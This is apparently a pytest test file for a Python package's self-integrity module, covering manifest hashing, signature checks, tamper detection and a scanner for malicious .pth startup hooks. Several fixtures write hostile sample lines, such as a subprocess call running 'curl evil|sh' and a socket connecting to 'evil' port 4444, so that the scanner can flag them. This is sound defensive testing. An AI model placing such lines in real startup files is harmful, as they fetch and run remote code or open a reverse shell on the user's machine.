"""
Tests for the self-integrity module (v0.8.1).

Coverage:
  - Manifest generation is deterministic
  - verify_self detects modified/missing/injected files
  - Signature verification (valid/invalid/unsigned)
  - .pth scanner: catches attack signature, no false positives on real hooks
  - .pth scanner: critical tokens flag even behind benign names
  - Fail-safe: missing manifest, unreadable files never raise
"""
import os
import tempfile

import pytest

from tokeymeter import integrity
from tokeymeter.audit import HMACSigner


@pytest.fixture
def fake_package(tmp_path):
    """A tiny fake package directory with a few files."""
    pkg = tmp_path / "pkg"
    pkg.mkdir()
    (pkg / "__init__.py").write_text("__version__ = '1.0.0'\n")
    (pkg / "core.py").write_text("def f():\n    return 42\n")
    sub = pkg / "sub"
    sub.mkdir()
    (sub / "mod.py").write_text("X = 1\n")
    return str(pkg)


# =================================================================
#                Manifest generation
# =================================================================

def test_manifest_lists_all_files(fake_package):
    m = integrity.generate_manifest(fake_package, package_version="1.0.0")
    assert "__init__.py" in m.files
    assert "core.py" in m.files
    assert "sub/mod.py" in m.files  # posix-style relative path
    assert len(m.files) == 3


def test_manifest_is_deterministic(fake_package):
    m1 = integrity.generate_manifest(fake_package, package_version="1.0.0")
    m2 = integrity.generate_manifest(fake_package, package_version="1.0.0")
    assert m1.manifest_hash() == m2.manifest_hash()


def test_manifest_excludes_pycache(fake_package):
    # Create a __pycache__ dir with junk
    pyc = os.path.join(fake_package, "__pycache__")
    os.makedirs(pyc, exist_ok=True)
    with open(os.path.join(pyc, "core.cpython-312.pyc"), "wb") as f:
        f.write(b"\x00\x01\x02")
    m = integrity.generate_manifest(fake_package, package_version="1.0.0")
    assert not any("__pycache__" in k for k in m.files)


def test_manifest_signature_roundtrip(fake_package):
    signer = HMACSigner(b"k" * 32)
    m = integrity.generate_manifest(fake_package, package_version="1.0.0", signer=signer)
    assert m.signature is not None
    assert m.signature_algorithm == "hmac-sha256"
    # Verify the signature manually
    sig = bytes.fromhex(m.signature)
    assert signer.verify(m.content_bytes(), sig)


# =================================================================
#                verify_self
# =================================================================

def test_verify_self_clean(fake_package):
    signer = HMACSigner(b"k" * 32)
    m = integrity.generate_manifest(fake_package, package_version="1.0.0", signer=signer)
    integrity.write_manifest(m, fake_package)
    report = integrity.verify_self(fake_package, signer=HMACSigner(b"k" * 32))
    assert report.status == "ok"
    assert report.ok
    assert report.files_ok == report.files_checked


def test_verify_self_unsigned_clean_is_unverified_not_ok(fake_package):
    """C2: a clean but UNSIGNED manifest is corruption-checked yet never
    reported trustworthy under the strict default."""
    m = integrity.generate_manifest(fake_package, package_version="1.0.0")  # unsigned
    integrity.write_manifest(m, fake_package)
    report = integrity.verify_self(fake_package)   # default require_signature=True
    assert report.status == "unverified"
    assert not report.ok
    # Corruption-only mode is an explicit opt-in:
    assert integrity.verify_self(fake_package, require_signature=False).ok


def test_verify_self_detects_modification(fake_package):
    m = integrity.generate_manifest(fake_package, package_version="1.0.0")
    integrity.write_manifest(m, fake_package)
    # Tamper a file
    with open(os.path.join(fake_package, "core.py"), "a") as f:
        f.write("\n# injected\n")
    report = integrity.verify_self(fake_package)
    assert report.status == "tampered"
    assert "core.py" in report.modified


def test_verify_self_detects_missing_file(fake_package):
    m = integrity.generate_manifest(fake_package, package_version="1.0.0")
    integrity.write_manifest(m, fake_package)
    os.remove(os.path.join(fake_package, "sub", "mod.py"))
    report = integrity.verify_self(fake_package)
    assert report.status == "tampered"
    assert "sub/mod.py" in report.missing


def test_verify_self_detects_injected_file(fake_package):
    m = integrity.generate_manifest(fake_package, package_version="1.0.0")
    integrity.write_manifest(m, fake_package)
    # Inject a new file not in the manifest
    with open(os.path.join(fake_package, "evil.py"), "w") as f:
        f.write("import os\n")
    report = integrity.verify_self(fake_package)
    assert report.status == "tampered"
    assert "evil.py" in report.extra


def test_verify_self_no_manifest(fake_package):
    # No manifest written
    report = integrity.verify_self(fake_package)
    assert report.status == "no_manifest"
    assert not report.ok


def test_verify_self_valid_signature(fake_package):
    signer = HMACSigner(b"k" * 32)
    m = integrity.generate_manifest(fake_package, package_version="1.0.0", signer=signer)
    integrity.write_manifest(m, fake_package)
    report = integrity.verify_self(fake_package, signer=HMACSigner(b"k" * 32))
    assert report.status == "ok"
    assert report.signature_status == "valid"


def test_verify_self_invalid_signature_key(fake_package):
    signer = HMACSigner(b"k" * 32)
    m = integrity.generate_manifest(fake_package, package_version="1.0.0", signer=signer)
    integrity.write_manifest(m, fake_package)
    # Wrong key
    report = integrity.verify_self(fake_package, signer=HMACSigner(b"WRONG" + b"k" * 27))
    assert report.status == "tampered"
    assert report.signature_status == "invalid"


def test_verify_self_require_signature_on_unsigned(fake_package):
    m = integrity.generate_manifest(fake_package, package_version="1.0.0")  # unsigned
    integrity.write_manifest(m, fake_package)
    report = integrity.verify_self(fake_package, require_signature=True)
    assert report.status == "unverified"
    assert not report.ok


def test_verify_self_forged_unsigned_manifest_rejected(fake_package):
    """C2 regression: an attacker who modifies files AND regenerates an
    unsigned manifest over them must NOT pass verification, even when the
    verifier holds a key."""
    signer = HMACSigner(b"k" * 32)
    m = integrity.generate_manifest(fake_package, package_version="1.0.0", signer=signer)
    integrity.write_manifest(m, fake_package)
    # Attacker modifies a file...
    with open(os.path.join(fake_package, "core.py"), "a") as f:
        f.write("\n# backdoor\n")
    # ...and re-stamps an UNSIGNED manifest over the tampered tree:
    m2 = integrity.generate_manifest(fake_package, package_version="1.0.0")
    integrity.write_manifest(m2, fake_package)
    report = integrity.verify_self(fake_package, signer=signer)
    assert not report.ok, "forged unsigned manifest must not verify"


def test_verify_self_signed_manifest_tampered_file_caught(fake_package):
    """Even with a valid signature on the manifest, a modified FILE is caught."""
    signer = HMACSigner(b"k" * 32)
    m = integrity.generate_manifest(fake_package, package_version="1.0.0", signer=signer)
    integrity.write_manifest(m, fake_package)
    # Modify a file WITHOUT regenerating the manifest
    with open(os.path.join(fake_package, "core.py"), "a") as f:
        f.write("\n# tampered\n")
    report = integrity.verify_self(fake_package, signer=HMACSigner(b"k" * 32))
    assert report.status == "tampered"
    assert report.signature_status == "valid"  # manifest sig still valid
    assert "core.py" in report.modified         # but the file is caught


# =================================================================
#                .pth scanner
# =================================================================

def test_pth_scan_clean_environment(tmp_path):
    # A legit editable + coverage .pth
    (tmp_path / "__editable__.foo.pth").write_text(
        "import __editable___foo; __editable___foo.install()\n"
    )
    (tmp_path / "distutils-precedence.pth").write_text(
        "import os; __import__('_distutils_hack').add_shim();\n"
    )
    report = integrity.scan_environment([str(tmp_path)])
    assert report.status == "clean"
    assert report.pth_files_scanned == 2


def test_pth_scan_catches_subprocess_attack(tmp_path):
    (tmp_path / "litellm_init.pth").write_text(
        "import subprocess; subprocess.Popen(['sh','-c','curl evil|sh'])\n"
    )
    report = integrity.scan_environment([str(tmp_path)])
    assert report.status == "suspicious"
    assert len(report.suspicious_pth) == 1
    assert report.suspicious_pth[0]["severity"] == "critical"


def test_pth_scan_catches_socket_reverse_shell(tmp_path):
    (tmp_path / "x.pth").write_text(
        "import socket; s=socket.socket(); s.connect(('evil',4444))\n"
    )
    report = integrity.scan_environment([str(tmp_path)])
    assert report.status == "suspicious"


def test_pth_scan_critical_token_overrides_benign_name(tmp_path):
    """An attacker naming their file coverage_*.pth but using subprocess
    is STILL caught — critical tokens ignore the benign-name allowlist."""
    (tmp_path / "coverage_evil.pth").write_text(
        "import subprocess; subprocess.Popen(['evil'])\n"
    )
    report = integrity.scan_environment([str(tmp_path)])
    assert report.status == "suspicious"
    assert report.suspicious_pth[0]["severity"] == "critical"


def test_pth_scan_legit_coverage_exec_not_flagged(tmp_path):
    """coverage.py legitimately uses exec() in a benign-named file — no flag."""
    (tmp_path / "a1_coverage.pth").write_text(
        "import sys; exec('import coverage; coverage.process_startup()')\n"
    )
    report = integrity.scan_environment([str(tmp_path)])
    assert report.status == "clean"


def test_pth_scan_unknown_file_with_exec_is_flagged(tmp_path):
    """exec() in an UNKNOWN-named file is worth review (soft severity)."""
    (tmp_path / "random_thing.pth").write_text(
        "import sys; exec('print(1)')\n"
    )
    report = integrity.scan_environment([str(tmp_path)])
    assert report.status == "suspicious"
    assert report.suspicious_pth[0]["severity"] == "review"


def test_pth_scan_ignores_normal_path_pth(tmp_path):
    """A plain path-adding .pth (the normal use) is never flagged."""
    (tmp_path / "normal.pth").write_text("/some/path/to/add\n/another/path\n")
    report = integrity.scan_environment([str(tmp_path)])
    assert report.status == "clean"


# =================================================================
#                Fail-safe
# =================================================================

def test_verify_self_never_raises_on_bad_dir():
    report = integrity.verify_self("/nonexistent/path/xyz")
    # No manifest there → no_manifest, not a crash
    assert report.status in ("no_manifest", "error")


def test_scan_environment_never_raises_on_bad_dir():
    report = integrity.scan_environment(["/nonexistent/path/xyz"])
    assert report.status in ("clean", "error")


def test_self_check_combines_both(fake_package):
    m = integrity.generate_manifest(fake_package, package_version="1.0.0")
    integrity.write_manifest(m, fake_package)
    # self_check uses the real package dir by default; just ensure it runs
    result = integrity.self_check(verbose=False)
    assert "integrity" in result
    assert "environment" in result
    assert "overall_ok" in result


# --- Regression tests for M1: broadened scanner coverage ---

def test_m1_scans_http_client_and_startup_modules(tmp_path):
    import os
    from tokeymeter import integrity
    d = str(tmp_path)
    open(os.path.join(d, "telemetry.pth"), "w").write("import http.client\n")
    open(os.path.join(d, "sitecustomize.py"), "w").write("import socket, subprocess\n")
    open(os.path.join(d, "usercustomize.py"), "w").write("import sys\n")
    rep = integrity.scan_environment(site_packages_dirs=[d])
    flagged = {os.path.basename(f["path"]) for f in rep.suspicious_pth}
    assert "telemetry.pth" in flagged       # http.client exfil now caught
    assert "sitecustomize.py" in flagged    # startup module now scanned
    assert "usercustomize.py" not in flagged # benign not flagged


# ── the zero-argument call path (regression: it was silently inert) ──────
# integrity.py lives at tokeymeter/engines/trust/, so the old default
# `dirname(__file__)` resolved there instead of the package root where
# _manifest.json ships. verify_self() — the documented, zero-argument call —
# therefore returned "no_manifest" on every installed wheel, silently
# disabling tamper detection. These pin the resolver and prove the check can
# actually fail.

def test_default_package_dir_is_the_package_root_not_this_module():
    import os
    import tokeymeter
    from tokeymeter.engines.trust.integrity import (
        _default_package_dir, MANIFEST_FILENAME)
    resolved = _default_package_dir()
    assert resolved == os.path.dirname(os.path.abspath(tokeymeter.__file__))
    # the manifest must actually be findable there — the whole point
    assert os.path.exists(os.path.join(resolved, MANIFEST_FILENAME))
    assert not resolved.endswith(os.path.join("engines", "trust"))


def test_verify_self_zero_arg_finds_the_manifest():
    """The documented call. Must never regress to 'no_manifest'."""
    from tokeymeter.engines.trust.integrity import verify_self
    r = verify_self(require_signature=False)
    assert r.status != "no_manifest", (
        "verify_self() cannot find the shipped manifest — tamper detection is "
        "inert on the documented call path")
    assert r.status == "ok", f"shipped package does not match its manifest: {r.status}"


def test_shipped_manifest_matches_the_shipped_files():
    """A stale manifest makes the package report itself as tampered, which is
    worse than no manifest: it cries wolf in a security review."""
    import os
    import tokeymeter
    from tokeymeter.engines.trust.integrity import verify_self
    pd = os.path.dirname(os.path.abspath(tokeymeter.__file__))
    r = verify_self(package_dir=pd, require_signature=False)
    assert r.status == "ok"
    assert not getattr(r, "modified", None)
    assert not getattr(r, "extra", None)


def test_tamper_detection_actually_fails_on_modification(tmp_path):
    """A check that cannot fail is decoration."""
    import os
    import shutil
    import tokeymeter
    from tokeymeter.engines.trust.integrity import verify_self
    pd = os.path.dirname(os.path.abspath(tokeymeter.__file__))
    victim = os.path.join(pd, "engines", "economics", "chargeback.py")
    backup = str(tmp_path / "chargeback.py.bak")
    shutil.copy2(victim, backup)
    try:
        with open(victim, "a") as f:
            f.write("\n# tamper probe\n")
        r = verify_self(package_dir=pd, require_signature=False)
        assert r.status == "tampered"
        assert any("chargeback" in m for m in (getattr(r, "modified", []) or []))
    finally:
        shutil.copy2(backup, victim)
    assert verify_self(package_dir=pd, require_signature=False).status == "ok"


def test_unsigned_manifest_is_reported_unverified_not_ok():
    """Honesty posture: without a signature the system must refuse to claim
    verification rather than quietly downgrading to 'ok'."""
    from tokeymeter.engines.trust.integrity import verify_self
    r = verify_self(require_signature=True)
    assert r.status == "unverified"


def test_every_manifested_file_is_declared_shippable():
    """The manifest hashes every file in the package dir, but only files listed
    in [tool.setuptools.package-data] are installed. Any mismatch makes an
    installed wheel report itself `tampered` for files that were simply never
    shipped — which is how this was found. Non-.py files inside the package
    must therefore be covered by package-data."""
    import os
    import tokeymeter
    pkg = os.path.dirname(os.path.abspath(tokeymeter.__file__))
    non_py = []
    for root, dirs, files in os.walk(pkg):
        dirs[:] = [d for d in dirs if d != "__pycache__"]
        for fn in files:
            if not fn.endswith((".py", ".pyc")):
                non_py.append(os.path.relpath(os.path.join(root, fn), pkg))
    # every non-.py file must match a declared package-data pattern
    allowed_exact = {"_manifest.json", "py.typed"}
    for rel in non_py:
        assert rel in allowed_exact or rel.endswith(".md"), (
            f"{rel} lives inside the package but is not covered by "
            f"package-data — an installed wheel would report `tampered`")
